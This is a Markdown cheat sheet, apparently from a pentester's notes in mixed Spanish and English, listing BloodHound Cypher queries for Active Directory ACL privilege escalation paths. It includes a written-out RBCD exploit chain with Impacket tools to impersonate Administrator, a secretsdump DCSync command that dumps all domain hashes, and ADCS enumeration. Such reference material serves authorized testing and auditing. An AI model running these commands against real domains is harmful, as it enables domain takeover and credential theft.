---
aliases:
  - ACL Chains
  - BloodHound Paths
  - Privesc Path Patterns
tags:
  - type/concept
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[AD - ACL Enumeration]]'
  - '[[BloodHound & SharpHound]]'
---
# AD - ACL Enumeration - ACL Path Patterns

***

## Direct Privesc Paths

| **Path** | **Cypher** | **Exploit** |
|:---:|:---:|:---:|
| `User → GenericAll → User` | `MATCH (a:User)-[:GenericAll]->(b:User) RETURN a,b` | Reset pwd b → login. |
| `User → GenericWrite → User` | `MATCH (a:User)-[:GenericWrite]->(b:User) RETURN a,b` | Set SPN / KeyCred. |
| `User → ForceChangePassword → User` | `MATCH (a:User)-[:ForceChangePassword]->(b:User) RETURN a,b` | Reset pwd. |
| `User → AddMember → Group` | `MATCH (a:User)-[:AddMember]->(g:Group) RETURN a,g` | Add self to group. |
| `User → WriteOwner → Object` | `MATCH (a:User)-[:WriteOwner]->(o) RETURN a,o` | Take ownership → grant self. |
| `User → WriteDacl → Object` | `MATCH (a:User)-[:WriteDacl]->(o) RETURN a,o` | Modify DACL → grant self. |
^ad-aclpath-direct

```cypher
// All direct paths from owned to high-value
MATCH (u {owned:true})
MATCH (t {highvalue:true})
MATCH p=shortestPath((u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AddMember|AddSelf|AllExtendedRights*1..]->(t))
RETURN p
```

___

## Group Membership Chains

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u {owned:true})-[:MemberOf*1..]->(g:Group)-[:GenericAll]->(t) RETURN u,g,t` | Owned member de group con ACE | Indirect privesc. |
| `MATCH (u {owned:true})-[:MemberOf*1..]->(g1:Group)-[:AddMember]->(g2:Group)-[:GenericAll]->(t) RETURN u,g1,g2,t` | Multi-hop chain | Complex paths. |
| `MATCH p=shortestPath((u {owned:true})-[*1..6]->(da:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p` | Shortest path a DA | Standard. |
^ad-aclpath-groups

___

## OU + GPO Chains

| **Cypher / Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u {owned:true})-[:WriteProperty]->(ou:OU)-[:GpLink]->(gpo:GPO) RETURN u,ou,gpo` | Owned puede modify gPLink | Link malicious GPO. |
| `MATCH (u {owned:true})-[:GenericAll\|GenericWrite]->(gpo:GPO)-[:GpLink]->(ou:OU)-[:Contains]->(c:Computer) RETURN u,gpo,ou,c` | Modify GPO + linked OU = mass compromise | GPO Abuse path. |
| `MATCH (u)-[:Owns\|GenericAll]->(gpo:GPO) RETURN u,gpo` | Quien controla GPOs | Audit. |
| `Get-GPO -All \| % { Get-GPPermission -Guid $_.Id -All }` | DACL per-GPO | RSAT audit. |
^ad-aclpath-ougpo

___

## Computer ACL → Lateral

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u {owned:true})-[:GenericAll\|GenericWrite]->(c:Computer) RETURN u,c` | Owned con ACL sobre computer | RBCD setup. |
| `MATCH (u {owned:true})-[:WriteProperty {objecttype:"3f78c3e5-..."}]->(c:Computer) RETURN u,c` | Specific RBCD attr write | RBCD direct. |
| `MATCH (u {owned:true})-[:CanRDP]->(c:Computer) RETURN u,c` | RDP access edge | Lateral simple. |
| `MATCH (u {owned:true})-[:CanPSRemote]->(c:Computer) RETURN u,c` | WinRM access | Lateral. |
| `MATCH (u {owned:true})-[:AdminTo]->(c:Computer) RETURN u,c` | Local admin | Lateral direct. |
^ad-aclpath-computer

```bash
# RBCD exploit chain (post-ACL)
# 1. Crear computer (default MachineAccountQuota=10)
addcomputer.py -computer-name 'evil$' -computer-pass 'EvilPass!' \
  'corp.local/atacante:pass'

# 2. Set RBCD
rbcd.py -delegate-to 'TARGET$' -delegate-from 'evil$' -action write \
  -dc-ip <DC> 'corp.local/atacante:pass'

# 3. S4U2Self + S4U2Proxy
getST.py -spn cifs/<target> -impersonate Administrator -dc-ip <DC> \
  'corp.local/evil$:EvilPass!'

# 4. Use TGS
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass corp.local/Administrator@<target>
```

___

## DCSync Path

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u {owned:true})-[:GetChanges\|GetChangesAll]->(d:Domain) RETURN u,d` | Owned con DCSync | Direct dump path. |
| `MATCH p=(u {owned:true})-[*1..]->(:Domain)-[:GetChanges\|GetChangesAll]->() RETURN p` | Path indirect a DCSync | Complex. |
| `MATCH (u)-[r:GetChanges]->(d:Domain) MATCH (u)-[r2:GetChangesAll]->(d) RETURN u.name` | Combo `GetChanges + GetChangesAll` | Full DCSync. |
^ad-aclpath-dcsync

```bash
secretsdump.py corp.local/atacante:pass@<DC> -just-dc
# Output: krbtgt + all NT hashes
```

___

## ADCS ESC1-ESC15 Paths

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u {owned:true})-[:Enroll\|AutoEnroll]->(t:CertTemplate {enrolleeSuppliesSubject:true}) RETURN u,t` | ESC1 paths | Cert + altSubjectName privesc. |
| `MATCH (u {owned:true})-[:Enroll]->(t:CertTemplate {hasAuthenticationEKU:true}) RETURN u,t` | Auth-capable templates | Pre-attack. |
| `certipy find -u u@corp.local -p pass -dc-ip <DC> -vulnerable -stdout` | Vulnerable templates | Linux. |
| `Certify.exe find /vulnerable` | Windows | Standard. |
^ad-aclpath-adcs

___

## Anti-Patterns (Avoid False Positives)

| **Comando** | **Qué filtrar** | **Por qué** |
|:---:|:---:|:---:|
| `Find-InterestingDomainAcl \| ? IdentityReferenceClass -ne "user"` | Excluir SYSTEM / Built-in / DA | Default ACEs legítimas. |
| `... \| ? IdentityReferenceName -notmatch "Domain Admins\|Enterprise Admins\|SYSTEM\|BUILTIN\|Cert Publishers\|Exchange"` | Exclude expected priv | Reduce noise. |
| `... \| ? ObjectAceType -ne "00000000-0000-0000-0000-000000000000"` | Exclude generic All-Extended-Rights | Default. |
| BloodHound `WHERE NOT u.objectid CONTAINS '-512' AND NOT u.objectid CONTAINS '-519'` | Exclude DA/EA SIDs | Standard exclusions. |
^ad-aclpath-antipatterns

___

## Owns Edge (Ownership)

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u)-[:Owns]->(t {highvalue:true}) RETURN u.name,t.name` | Owners de high-value | Critical hunt. |
| `Get-ADObject "<DN>" -Pr nTSecurityDescriptor \| % {$_.nTSecurityDescriptor.Owner}` | Owner actual | Per-object. |
| `(Get-Acl "AD:<DN>").Owner` | Owner via Get-Acl | Standard. |
^ad-aclpath-owns

**Ownership = implicit Modify Permissions** = grant self GenericAll. Owners no aparecen en `Find-InterestingDomainAcl` default — chequear separadamente.

___

## Cypher Workhorse Queries

```cypher
// 1. Shortest path desde owned a Domain Admins (any domain)
MATCH (u {owned:true})
MATCH (g:Group) WHERE g.name CONTAINS "DOMAIN ADMINS"
MATCH p=shortestPath((u)-[*1..]->(g))
RETURN p

// 2. ACL paths to high-value (excluyendo defaults)
MATCH p=(u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AddMember|AllExtendedRights]->(t {highvalue:true})
WHERE NOT u.objectid ENDS WITH '-512'
  AND NOT u.objectid ENDS WITH '-519'
  AND NOT u.objectid ENDS WITH '-518'
RETURN p

// 3. DCSync paths
MATCH (u)-[r:GetChanges|GetChangesAll]->(d:Domain)
WHERE NOT u.objectid ENDS WITH '-516'  // exclude Domain Controllers
RETURN u.name,d.name,type(r)

// 4. Foreign principals con high-value ACL
MATCH (u)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword]->(t {highvalue:true})
WHERE u.domain <> t.domain
RETURN u.name,u.domain,t.name,t.domain,type(r)

// 5. Stale priv users con ACL paths
MATCH (u:User {enabled:true})-[*1..]->(t {highvalue:true})
WHERE u.lastlogon < timestamp() / 1000 - 15552000  // 180d
RETURN u.name,u.lastlogon
```
^ad-aclpath-cypher

***
